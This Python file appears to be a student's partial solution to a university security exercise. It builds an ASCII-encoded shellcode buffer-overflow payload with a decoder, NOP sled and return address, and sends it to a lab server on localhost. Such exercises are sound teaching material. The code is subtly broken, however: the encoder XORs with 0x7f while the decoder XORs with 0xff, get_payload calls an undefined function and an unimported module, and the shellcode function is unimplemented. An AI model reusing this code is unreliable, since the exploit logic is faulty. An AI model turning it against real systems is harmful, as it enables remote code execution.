import functools
import os
import socket
import traceback
import q2

from infosec.core import assemble, smoke
from typing import Tuple, Iterable


HOST = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT = 1337


ASCII_MAX = 0x7f

DECODER_FILE_PATH = "decoder.asm"

NEW_LINE = "\n"

INC_EBX_AS_NOP = "\x66\x31\xf6"

def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)

    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(c > ASCII_MAX for c in selector(ret)):
                smoke.warning(f'Non ASCII chars in return value from '
                              f'{func.__name__} at '
                              f'{"".join(traceback.format_stack()[:-1])}')
            return ret
        return result
    return decorator


def get_raw_shellcode():
    return q2.get_shellcode()


@warn_invalid_ascii(lambda result: result[0])
def encode(data: bytes) -> Tuple[bytes, Iterable[int]]:
    """Encode the given data to be valid ASCII.

    As we recommended in the exercise, the easiest way would be to XOR
    non-ASCII bytes with 0xff, and have this function return the encoded data
    and the indices that were XOR-ed.

    Tips:
    1. To return multiple values, do `return a, b`

    Args:
        data - The data to encode

    Returns:
        A tuple of [the encoded data, the indices that need decoding]
    """
    data_bytes_lst = list(data)
    patched_indexes = []

    for idx, byte in enumerate(data_bytes_lst):
        if byte <= ASCII_MAX:
            continue
        data_bytes_lst[idx] ^= ASCII_MAX
        patched_indexes.append(idx)
    
    patched_data = bytes(data_bytes_lst)
    return patched_data, patched_indexes
        

@warn_invalid_ascii()
def get_decoder_code(indices: Iterable[int]) -> bytes:
    """This function returns the machine code (bytes) of the decoder code.

    In this question, the "decoder code" should be the code which decodes the
    encoded shellcode so that we can properly execute it. Assume you already
    have the address of the shellcode, and all you need to do here is to do the
    decoding.

    Args:
        indices - The indices of the shellcode that need the decoding (as
        returned from `encode`)

    Returns:
         The decoder coder (assembled, as bytes)
    """
    decoder_code = ""
    for idx in indices:
        # ascii bytes code that effectivly does:
        # mov bl, 0xff 
        decoder_code += "push 0x100" + NEW_LINE
        decoder_code += "pop ebx" + NEW_LINE
        decoder_code += "dec ebx" + NEW_LINE
        decoder_code += f"xor byte ptr [eax + {idx}], bl" + NEW_LINE
    with open(DECODER_FILE_PATH, "w") as writer:
        writer.write(decoder_code)
    return assemble.assemble_file(DECODER_FILE_PATH)


@warn_invalid_ascii()
def get_ascii_shellcode() -> bytes:
    """This function returns the machine code (bytes) of the shellcode.

    In this question, the "shellcode" should be the code which if we put EIP to
    point at, it will open the shell. Since we need this shellcode to be
    entirely valid ASCII, the "shellcode" is made of the following:

    - The instructions needed to find the address of the encoded shellcode
    - The encoded shellcode, which is just the shellcode from q2 after encoding
      it using the `encode()` function we defined above
    - The decoder code needed to extract the encoded shellcode

    As before, this does not include the size of the message sent to the server,
    the return address we override, the nop slide or anything else!

    Tips:
    1. This function is for your convenience, and will not be tested directly.
       Feel free to modify it's parameters as needed.
    2. Use the `assemble` module to translate any additional instructions into
       bytes.

    Returns:
         The bytes of the shellcode.
    """
    q2_shellcode = get_raw_shellcode()
    # TODO: IMPLEMENT THIS FUNCTION
    raise NotImplementedError()


@warn_invalid_ascii(lambda payload: payload[4:-5])
def get_payload() -> bytes:
    """This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode, the return address (and the zero at the end).

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    encoded_shellcode = get_encoded_shellcode()
    # xor si, si
    ret_addr = struct.pack("<I", 0x12345678)
    payload = encoded_shellcode.rjust(1040, INC_EBX_AS_NOP) + ret_addr + "\0".encode('latin1')
    return payload

def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
